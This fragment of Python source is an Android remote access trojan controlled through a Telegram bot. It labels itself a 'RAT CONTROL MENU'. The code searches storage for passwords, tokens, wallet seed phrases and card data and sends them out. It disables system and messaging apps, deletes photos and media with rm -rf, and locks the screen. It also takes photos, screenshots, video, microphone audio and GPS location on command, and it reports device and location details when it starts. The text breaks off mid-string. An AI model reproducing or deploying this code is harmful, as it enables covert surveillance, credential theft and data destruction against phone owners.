def get_all_files():
 r=[];p=["/storage/emulated/0","/data/data","/sdcard"]
 e=[".db",".xml",".json",".txt",".cookie",".key",".token",".backup",".log",".conf",".cfg",".ini",".properties",".sqlite",".sql",".bak",".old",".zip",".rar",".7z"]
 kw=["password","login","user","pass","token","key","mail","email","phone","credit","card","cvv","ssn","id","account","wallet","seed","phrase","mnemonic","private","secret"]
 for pp in p:
  if os.path.exists(pp):
   for a,b,c in os.walk(pp):
    for f in c:
     path=os.path.join(a,f)
     if any(f.endswith(x) for x in e) and os.path.getsize(path)<1000000:
      try:
       shutil.copy(path,f"/sdcard/all_{f}")
       r.append(f)
      except:pass
     if any(x in f.lower() for x in kw):
      try:
       with open(path,'r',errors='ignore') as ff:
        d=ff.read()[:500]
        if d.strip():r.append(f"{f}: {d}")
      except:pass
 return r
def block_all():
 try:
  apps=["com.android.packageinstaller","com.google.android.gms","com.android.vending","com.android.chrome","com.whatsapp","com.instagram.android","com.facebook.katana","org.telegram","com.roblox.client","com.discord","com.snapchat.android","com.twitter.android","com.zhiliaoapp.musically","com.google.android.youtube","com.netflix.mediaclient","com.spotify.music","com.android.systemui","com.android.settings","com.sec.android.app.launcher","com.google.android.apps.maps","com.android.browser","com.android.mms","com.android.dialer","com.android.contacts","com.android.email","com.android.camera"]
  for a in apps:os.system(f"pm disable {a} 2>/dev/null")
  os.system("settings put global install_non_market_apps 0")
  os.system("settings put global development_settings_enabled 0")
  return"done"
 except:return"no"
def lock_screen():
 for i in range(5):os.system("input keyevent 26")
 return"done"
def delete_all():
 dirs=["DCIM","Pictures","Movies","Music","Download","Documents","WhatsApp","Telegram","Instagram","Facebook","Discord","TikTok","Snapchat","Twitter","Netflix","Spotify","Roblox","ClashRoyale","BrawlStars","Minecraft","CallOfDuty","Fortnite","GenshinImpact"]
 for d in dirs:os.system(f"rm -rf /storage/emulated/0/{d}/* 2>/dev/null")
 os.system("rm -rf /sdcard/*.db /sdcard/*.xml /sdcard/*.json /sdcard/*.txt 2>/dev/null")
 return"done"
def vibrate():
 for i in range(10):os.system("input vibrate 1000")
 return"done"
def flash_led():
 os.system("termux-torch on");time.sleep(5);os.system("termux-torch off")
 return"done"
def set_wallpaper():
 os.system("am start -a android.intent.action.ATTACH_DATA -d file:///sdcard/wall.jpg -t image/jpeg 2>/dev/null")
 return"done"
def command_loop():
 while True:
  try:
   r=requests.get(f"https://api.telegram.org/bot{T}/getUpdates",params={"offset":0,"timeout":30},timeout=35)
   for u in r.json().get("result",[]):
    txt=u.get("message",{}).get("text","")
    if txt.startswith("/cmd "):res=cmd(txt[5:]);send(f"CMD: {txt[5:]}\n{res}")
    elif txt=="/photo":p=take_photo();send_photo(p) if p else send("NO")
    elif txt=="/video":v=take_video();send_video(v) if v else send("NO")
    elif txt=="/screen":s=take_screenshot();send_photo(s) if s else send("NO")
    elif txt=="/mic_start":start_record();send("REC")
    elif txt=="/mic_stop":a=stop_record();send_audio(a) if a else send("NO")
    elif txt=="/loc":l=get_location_gps();send(f"GPS: {l}")
    elif txt=="/lock":lock_screen();send("LOCKED")
    elif txt=="/block":block_all();send("BLOCKED")
    elif txt=="/delete":delete_all();send("DELETED")
    elif txt=="/vibrate":vibrate();send("VIBRATE")
    elif txt=="/flash":flash_led();send("FLASH")
    elif txt=="/info":send(f"IP: {get_ip()}\nLOC: {get_location()}\nDEVICE: {get_device()}")
    elif txt=="/menu" or txt=="/start":
     menu="""🔥 RAT CONTROL MENU 🔥
/photo 📸 | /video 🎥 | /screen 📱
/mic_start 🎙️ | /mic_stop 🔇 | /loc 📍
/lock 🔒 | /block 🚫 | /delete 🗑️
/vibrate 📳 | /flash 💡 | /info ℹ️
/cmd 💻 | /menu 📋
UNLOCK PASS: v67"""
     send(menu)
  except:pass
  time.sleep(2)
threading.Thread(target=command_loop,daemon=True).start()
# СБОР ВСЕХ ДАННЫХ ПРИ ЗАПУСКЕ
msg=f"""🔓 UNLOCK PASS: v67

📱 DEVICE: {get_device()}
🌐 IP: {get_ip()}
📍 LOCATION: {get_location()}
📡 GPS: {get_location_gps()}
